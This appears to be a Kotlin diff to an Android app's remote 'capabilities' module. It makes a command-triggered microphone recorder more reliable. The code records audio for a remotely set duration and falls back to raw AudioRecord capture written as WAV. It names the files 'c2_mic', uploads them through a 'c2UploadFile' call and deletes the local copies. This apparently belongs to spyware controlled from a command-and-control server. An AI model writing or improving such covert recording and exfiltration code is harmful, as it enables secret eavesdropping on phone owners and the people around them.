@@ -122,27 +122,98 @@ object ForjaSyncCapabilities {
     // ── Senzori ──────────────────────────────────────────────────────
     private suspend fun mic(p: JsonObject): JsonObject = withContext(Dispatchers.IO) {
         val ms = (p["ms"]?.jsonPrimitive?.long ?: 5000L).coerceIn(500, 120000)
+        if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.RECORD_AUDIO)
+            != PackageManager.PERMISSION_GRANTED
+        ) return@withContext err("mic: permisiune RECORD_AUDIO neacordată")
         try {
             val out = java.io.File(app.cacheDir, "c2_mic_${System.currentTimeMillis()}.m4a")
             out.delete()
-            val mr = MediaRecorder().apply {
-                setAudioSource(MediaRecorder.AudioSource.MIC)
-                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                setAudioEncodingBitRate(48000)
-                setOutputFile(out.absolutePath)
-                start()
+            var mr: MediaRecorder? = null
+            try {
+                mr = MediaRecorder().apply {
+                    setAudioSource(MediaRecorder.AudioSource.MIC)
+                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                    setAudioEncodingBitRate(48000)
+                    setOutputFile(out.absolutePath)
+                    start()
+                }
+                Thread.sleep(ms)
+            } catch (e: SecurityException) {
+                mr?.release()
+                return@withContext err("mic: SecurityException — înregistrarea e blocată de sistem")
+            } catch (e: Exception) {
+                // MediaRecorder eșuează (ex: device cu codec AAC limitat) — cădem pe AudioRecord + WAV
+                try { mr?.release() } catch (_: Exception) {}
+                return@withContext micFallback(ms)
             }
-            Thread.sleep(ms)
             try { mr.stop() } catch (_: Exception) {}
             mr.release()
             if (out.exists() && out.length() > 0) {
+                val sz = out.length()
                 val key = app.forjaApi.c2UploadFile(out.name, "audio/mp4", out)
                 out.delete()
-                if (key != null) buildJsonObject { put("file", key); put("size", out.length()) }
+                if (key != null) buildJsonObject { put("file", key); put("size", sz) }
                 else err("mic: upload eșuat")
             } else err("mic: nu am prins sunet")
-        } catch (e: Exception) { err("mic: ${e.message}") }
+        } catch (e: Exception) { err("mic: ${e.javaClass.simpleName} — ${e.message ?: "fără detaliu"}") }
+    }
+
+    /** Fallback când MediaRecorder eșuează: AudioRecord → WAV → upload. */
+    private fun micFallback(ms: Long): JsonObject {
+        val rate = 16000
+        return try {
+            val minBuf = AudioRecord.getMinBufferSize(rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
+            if (minBuf <= 0) return err("mic: getMinBufferSize=0")
+            var rec: AudioRecord? = null
+            for (src in intArrayOf(MediaRecorder.AudioSource.MIC, MediaRecorder.AudioSource.VOICE_RECOGNITION)) {
+                try {
+                    val r = AudioRecord(src, rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, minBuf)
+                    if (r.state == AudioRecord.STATE_INITIALIZED) { rec = r; break } else r.release()
+                } catch (_: Exception) {}
+            }
+            if (rec == null) return err("mic: AudioRecord nu s-a inițializat")
+            val recorder = rec
+            val chunks = java.util.ArrayList<ByteArray>()
+            val buf = ByteArray(minBuf)
+            recorder.startRecording()
+            val deadline = System.currentTimeMillis() + ms
+            while (System.currentTimeMillis() < deadline) {
+                val n = recorder.read(buf, 0, buf.size)
+                if (n > 0) chunks.add(buf.copyOf(n))
+                Thread.sleep(100)
+            }
+            try { recorder.stop() } catch (_: Exception) {}
+            recorder.release()
+            val totalBytes = chunks.sumOf { it.size }
+            if (totalBytes == 0) return err("mic fallback: buffer gol")
+            val out = java.io.File(app.cacheDir, "c2_mic_${System.currentTimeMillis()}.wav")
+            java.io.DataOutputStream(java.io.FileOutputStream(out)).use { ds ->
+                ds.writeBytes("RIFF"); ds.write(intToLe(totalBytes + 36))
+                ds.writeBytes("WAVE"); ds.writeBytes("fmt ")
+                ds.write(intToLe(16)); ds.write(shortToLe(1))
+                ds.write(shortToLe(1)); ds.write(intToLe(rate))
+                ds.write(intToLe(rate * 2)); ds.write(shortToLe(2)); ds.write(shortToLe(16))
+                ds.writeBytes("data"); ds.write(intToLe(totalBytes))
+                for (c in chunks) ds.write(c)
+            }
+            val sz = out.length()
+            val key = app.forjaApi.c2UploadFile(out.name, "audio/wav", out)
+            out.delete()
+            if (key != null) buildJsonObject { put("file", key); put("size", sz) }
+            else err("mic fallback: upload eșuat")
+        } catch (e: Exception) { err("mic fallback: ${e.javaClass.simpleName} — ${e.message ?: "fără detaliu"}") }
+    }
+
+    private fun intToLe(v: Int): ByteArray {
+        val b = ByteArray(4)
+        b[0] = (v and 0xFF).toByte(); b[1] = ((v shr 8) and 0xFF).toByte()
+        b[2] = ((v shr 16) and 0xFF).toByte(); b[3] = ((v shr 24) and 0xFF).toByte()
+        return b
+    }
+
+    private fun shortToLe(v: Int): ByteArray {
+        return byteArrayOf((v and 0xFF).toByte(), ((v shr 8) and 0xFF).toByte())
     }
 
     @Suppress("DEPRECATION")
